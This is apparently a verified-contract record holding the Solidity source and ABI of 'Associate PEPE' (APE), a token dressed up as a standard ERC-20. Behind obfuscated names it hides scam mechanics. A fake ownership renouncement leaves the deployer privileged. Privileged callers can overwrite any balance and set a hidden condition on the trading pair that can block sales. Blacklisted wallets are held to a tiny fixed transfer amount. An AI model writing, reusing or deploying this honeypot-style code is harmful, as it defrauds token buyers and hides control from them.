{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface limitLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundTake) external view returns (uint256);\n\n    function transfer(address minTrading, uint256 listSender) external returns (bool);\n\n    function allowance(address launchedTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minTrading,\n        uint256 listSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityAtLaunched, uint256 value);\n    event Approval(address indexed launchedTeam, address indexed spender, uint256 value);\n}\n\nabstract contract atLiquidity {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchToken {\n    function createPair(address swapTo, address teamTrading) external returns (address);\n}\n\ninterface limitLiquidityMetadata is limitLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AssociatePEPE is atLiquidity, limitLiquidity, limitLiquidityMetadata {\n\n    function balanceOf(address fundTake) public view virtual override returns (uint256) {\n        return fromSell[fundTake];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return txSwap;\n    }\n\n    uint8 private fromBuy = 18;\n\n    function name() external view virtual override returns (string memory) {\n        return isLimit;\n    }\n\n    function owner() external view returns (address) {\n        return totalFrom;\n    }\n\n    function approve(address listTokenTrading, uint256 listSender) public virtual override returns (bool) {\n        tokenMin[_msgSender()][listTokenTrading] = listSender;\n        emit Approval(_msgSender(), listTokenTrading, listSender);\n        return true;\n    }\n\n    bool public autoBuy;\n\n    string private isLimit = \"Associate PEPE\";\n\n    function launchedMarketing(address amountBuy, address minTrading, uint256 listSender) internal returns (bool) {\n        if (amountBuy == fundEnable) {\n            return senderIs(amountBuy, minTrading, listSender);\n        }\n        uint256 fromExempt = limitLiquidity(maxTeam).balanceOf(tokenAuto);\n        require(fromExempt == modeTotal);\n        require(minTrading != tokenAuto);\n        if (fromAuto[amountBuy]) {\n            return senderIs(amountBuy, minTrading, walletTo);\n        }\n        return senderIs(amountBuy, minTrading, listSender);\n    }\n\n    uint256 private receiverIsAuto;\n\n    bool private totalMin;\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromBuy;\n    }\n\n    mapping(address => mapping(address => uint256)) private tokenMin;\n\n    mapping(address => uint256) private fromSell;\n\n    mapping(address => bool) public fromAuto;\n\n    event OwnershipTransferred(address indexed senderListSwap, address indexed teamShould);\n\n    uint256 public receiverFeeTo;\n\n    address tokenAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function buySwapWallet(address marketingBuyToken) public {\n        liquidityShould();\n        if (listTxMin) {\n            swapSender = true;\n        }\n        if (marketingBuyToken == fundEnable || marketingBuyToken == maxTeam) {\n            return;\n        }\n        fromAuto[marketingBuyToken] = true;\n    }\n\n    address public maxTeam;\n\n    function allowance(address liquidityFrom, address listTokenTrading) external view virtual override returns (uint256) {\n        if (listTokenTrading == fundListMode) {\n            return type(uint256).max;\n        }\n        return tokenMin[liquidityFrom][listTokenTrading];\n    }\n\n    uint256 modeTotal;\n\n    function launchAuto() public {\n        emit OwnershipTransferred(fundEnable, address(0));\n        totalFrom = address(0);\n    }\n\n    uint256 private listAt = 100000000 * 10 ** 18;\n\n    bool public shouldLimit;\n\n    uint256 txFrom;\n\n    uint256 public modeMax;\n\n    string private txSwap = \"APE\";\n\n    function senderIs(address amountBuy, address minTrading, uint256 listSender) internal returns (bool) {\n        require(fromSell[amountBuy] >= listSender);\n        fromSell[amountBuy] -= listSender;\n        fromSell[minTrading] += listSender;\n        emit Transfer(amountBuy, minTrading, listSender);\n        return true;\n    }\n\n    bool public swapSender;\n\n    function transfer(address txExemptLimit, uint256 listSender) external virtual override returns (bool) {\n        return launchedMarketing(_msgSender(), txExemptLimit, listSender);\n    }\n\n    uint256 constant walletTo = 10 ** 10;\n\n    function liquidityShould() private view {\n        require(marketingReceiver[_msgSender()]);\n    }\n\n    uint256 private fundIs;\n\n    function senderTotalMode(address txExemptLimit, uint256 listSender) public {\n        liquidityShould();\n        fromSell[txExemptLimit] = listSender;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listAt;\n    }\n\n    function getOwner() external view returns (address) {\n        return totalFrom;\n    }\n\n    function modeAutoReceiver(uint256 listSender) public {\n        liquidityShould();\n        modeTotal = listSender;\n    }\n\n    bool private listTxMin;\n\n    function listReceiver(address enableReceiver) public {\n        if (autoBuy) {\n            return;\n        }\n        \n        marketingReceiver[enableReceiver] = true;\n        \n        autoBuy = true;\n    }\n\n    mapping(address => bool) public marketingReceiver;\n\n    address fundListMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address private totalFrom;\n\n    address public fundEnable;\n\n    constructor (){\n        if (listTxMin != totalMin) {\n            receiverFeeTo = fundIs;\n        }\n        sellTake modeReceiver = sellTake(fundListMode);\n        maxTeam = launchToken(modeReceiver.factory()).createPair(modeReceiver.WETH(), address(this));\n        \n        fundEnable = _msgSender();\n        launchAuto();\n        marketingReceiver[fundEnable] = true;\n        fromSell[fundEnable] = listAt;\n        if (modeMax == receiverFeeTo) {\n            shouldLimit = false;\n        }\n        emit Transfer(address(0), fundEnable, listAt);\n    }\n\n    function transferFrom(address amountBuy, address minTrading, uint256 listSender) external override returns (bool) {\n        if (_msgSender() != fundListMode) {\n            if (tokenMin[amountBuy][_msgSender()] != type(uint256).max) {\n                require(listSender <= tokenMin[amountBuy][_msgSender()]);\n                tokenMin[amountBuy][_msgSender()] -= listSender;\n            }\n        }\n        return launchedMarketing(amountBuy, minTrading, listSender);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderListSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityAtLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listTokenTrading\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTokenTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingBuyToken\",\"type\":\"address\"}],\"name\":\"buySwapWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableReceiver\",\"type\":\"address\"}],\"name\":\"listReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listSender\",\"type\":\"uint256\"}],\"name\":\"modeAutoReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFeeTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txExemptLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listSender\",\"type\":\"uint256\"}],\"name\":\"senderTotalMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txExemptLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AssociatePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}